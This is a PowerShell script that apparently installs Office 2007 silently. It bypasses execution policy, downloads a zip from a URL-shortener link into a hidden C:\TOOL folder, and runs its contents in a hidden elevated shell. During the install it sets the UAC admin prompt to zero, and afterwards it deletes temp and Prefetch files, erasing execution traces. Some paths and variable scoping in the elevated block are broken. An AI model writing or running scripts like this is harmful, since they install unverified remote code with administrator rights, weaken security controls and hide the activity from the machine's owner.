Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass

$TOOL = "C:\TOOL"

if ($TOOL) {
    Remove-Item -Path $TOOL -Recurse -Force -ErrorAction SilentlyContinue
}

[System.IO.Directory]::CreateDirectory($TOOL)
$TOOLFOLDER = Get-Item $TOOL 
$TOOLFOLDER.Attributes = "Hidden" 

$webClient = New-Object -TypeName System.Net.WebClient
$task = $webClient.DownloadFileTaskAsync("https://seulink.net/TOOLZIP", "$TOOL\MZTOOL.zip")

Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -SourceIdentifier WebClient.DownloadProgressChanged | Out-Null

Start-Sleep -Seconds 3

while (!($task.IsCompleted)) {
    $EventData = Get-Event -SourceIdentifier WebClient.DownloadProgressChanged | Select-Object -ExpandProperty "SourceEventArgs" -Last 1

    $ReceivedData = ($EventData | Select-Object -ExpandProperty "BytesReceived")
    $TotalToReceive = ($EventData | Select-Object -ExpandProperty "TotalBytesToReceive")
    $TotalPercent = $EventData | Select-Object -ExpandProperty "ProgressPercentage"

    Start-Sleep -Seconds 2

    function convertFileSize {
        param(
            $bytes
        )

        if ($bytes -lt 1MB) {
            return "$([Math]::Round($bytes / 1KB, 2)) KB"
        }
        elseif ($bytes -lt 1GB) {
            return "$([Math]::Round($bytes / 1MB, 2)) MB"
        }
        elseif ($bytes -lt 1TB) {
            return "$([Math]::Round($bytes / 1GB, 2)) GB"
        }
    }
    Write-Progress -Activity "Downloading File" -Status "Percent Complete: $($TotalPercent)%" -CurrentOperation "Downloaded $(convertFileSize -bytes $ReceivedData) / $(convertFileSize -bytes $TotalToReceive)" -PercentComplete $TotalPercent

}

Unregister-Event -SourceIdentifier WebClient.DownloadProgressChanged
$webClient.Dispose()

Expand-Archive -LiteralPath $TOOL\MZTOOL.zip -DestinationPath $TOOL

Remove-Item $TOOL\MZTOOL.zip

Start-Process powershell -Verb runAs -WindowStyle hidden -Wait { 

    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

    Invoke-Command -ScriptBlock { Start-Process "$TOOL\OFFICE\2007\Setup.exe" -ArgumentList "/adminfile Silent.msp" -Wait }
        
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 5
    
    Start-Sleep -Seconds 20

    Remove-Item -Path $env:TEMP\* -Recurse -Force -ErrorAction SilentlyContinue 

    Remove-Item -Path $env:C:\Windows\temp\* -Recurse -Force -ErrorAction SilentlyContinue

    Remove-Item -Path $env:C:\Windows\Prefetch\* -Recurse -Force -ErrorAction SilentlyContinue

    
}
exit